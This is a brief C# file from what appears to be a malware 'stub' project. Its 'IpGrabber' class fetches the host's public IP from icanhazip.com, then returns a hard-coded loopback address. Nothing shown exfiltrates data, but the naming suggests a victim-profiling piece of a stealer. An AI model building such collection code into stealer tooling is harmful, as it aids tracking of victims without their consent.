using System.Net;

namespace stub
{
    internal class IpGrabber
    {
        static string externalIpString = WebClientHandler.wcReturn().DownloadString("http://icanhazip.com").Replace("\\r\\n", "").Replace("\\n", "").Trim();

        public static string IpReturn()
        {
            var externalIp = IPAddress.Parse(externalIpString);
            //return externalIp.ToString();
            return "127.0.0.1";
        }
    }
}
